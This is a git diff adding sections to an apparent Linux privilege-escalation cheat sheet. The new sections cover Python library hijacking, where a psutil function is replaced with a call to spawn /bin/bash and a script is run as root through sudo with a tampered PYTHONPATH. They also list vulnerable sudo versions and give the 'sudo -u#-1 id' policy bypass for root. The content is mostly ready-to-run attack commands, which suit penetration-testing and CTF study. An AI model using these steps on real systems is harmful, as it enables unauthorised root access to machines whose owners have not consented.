@@ -1871,9 +1871,57 @@ gcc src.c -fPIC -shared -o /development/libshared.so
 ```
 
 ### Python Library hijacking
-####
+#### Check a Python Script
+```
+ls -lah python.py
+```
+#### Check Module Permissions
+```
+grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
+ls -lah /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+```
+#### Change function in init.py
+```
+def virtual_memory():
+    import os
+    os.system('/bin/bash')
+```
+#### Run the Python Script
+### Change Python Path Variable
+#### Check sudo permission and see for setenv in python3
+```
+sudo -l
+```
+#### Set ENV by copying init to temp and change it.
+```
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py
+```
 
 ## Recent 0-Days
+### Sudo Version
+#### Versions of sudo are vulnerable
+1.8.31 - Ubuntu 20.04
+1.8.27 - Debian 10
+1.9.2 - Fedora 33
+and others
+#### Check Sudo Version
+```
+sudo -V
+```
+### Sudo Policy Bypass
+#### Check Sudo Permissions for entry in /etc/sudoers
+```
+sudo -l
+```
+#### Root
+```
+sudo -u#-1 id
+```
+
+### Polkit
+### Dirty Pipe
+### Netfilter
+
 ## Hardening Considerations
 
 # Windows Privilege Escalation
